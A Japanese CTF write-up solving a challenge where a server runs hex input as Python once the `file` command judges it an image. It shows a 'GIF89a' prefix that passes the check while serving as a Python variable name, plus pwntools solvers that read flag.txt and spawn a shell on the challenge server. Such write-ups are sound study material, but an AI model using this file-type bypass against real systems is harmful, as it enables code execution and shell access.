# Image Python

私の好みな問題でした。入力制限を突破するタイプの問題が好きなのかもしれません。

## 問題

画像をPythonとして実行するの？あほらしい...
```py
import subprocess

img = bytes.fromhex(input("hex bytes> "))

mime = subprocess.check_output(
    ["file", "--mime-type", "-b", "-"],
    input=img
).decode().strip()

if not mime.startswith("image/"):
    print("This doesn't look like an image...")
    exit()

exec(img)
```

## 概要

最初に、バイナリデータ`img`を16進数で入力することを求められます。

そして、`img`を`file`コマンドにかけて画像ファイルっぽいと確認できた場合は、`img`をPythonのコードとして実行します。

画像ファイルとして認識され、かつ、フラグを取得するようなPythonのコードにするためには、どんなバイナリデータにすればいいのでしょうか？

## 解法

まず、バイナリデータ`img`を`file`コマンドに画像ファイルであると誤認識させるところから考えます。

私が真っ先に思い付いたのはビットマップファイルでした。

ビットマップファイルは必ずシグネチャ`BM`から始まることが決まっています。

これならたったの2文字で扱いやすそうです。しかし、
```
$ echo "BM...." > data.bin
$ file data.bin
data.bin: ASCII text
```
テキストファイルであることがバレてしまいました。

どうやら`file`コマンドにビットマップ画像と認識させるには、ファイルヘッダーのみならず情報ヘッダーまで作りこむ必要があるようです。

あまり長いと扱いにくいので他をあたることにします。

JPEGやPNGはそもそも1文字目がASCII文字ではないので試しませんでした。

そしてちょうど使えそうなのを見つけました。
```
$ echo "GIF89a...." > data.bin
$ file data.bin
data.bin: GIF image data, version 89a, 11822 x 11822
```
GIF画像ファイルであると誤認識させることに成功しました！

あとはこれをフラグを表示するPythonソースコードにすればいいのですが、厄介なことにこの先頭にある邪魔な`GIF89a`を無視することはできません。

ですが、幸いこの`GIF89a`はPythonの変数名として使うことができる識別子ですので、代入先の変数名として消化し、フラグ出力部分を続けることにします。
```
GIF89a=print(open('flag.txt','r').read())
```
※代入しないとだめです。`GIF89a`が定義されていないエラーになってしまいます。

このデータを使ってフラグを取得するソルバーは下記のようになります。
```py
import pwn

#HOST, PORT = "localhost", 1337
HOST, PORT = "34.170.146.252", 29529
p = pwn.remote(HOST, PORT)

payload = b"GIF89a=print(open('flag.txt','r').read())".hex()
p.sendlineafter(b'> ', payload.encode())
print(p.recvall().decode())
```

さらに、下記のようにすればシェルを取って好き勝手することができます。

よくあるファイル名にハッシュ値が付けられるやつにも対応できるので、CTFとしてはこっちの方がより美しいでしょうか？
```py
import pwn

#HOST, PORT = "localhost", 1337
HOST, PORT = "34.170.146.252", 29529
p = pwn.remote(HOST, PORT)

payload = b"GIF89a=0;import os;os.system('sh')".hex()
p.sendlineafter(b'> ', payload.encode())
p.interactive()
```
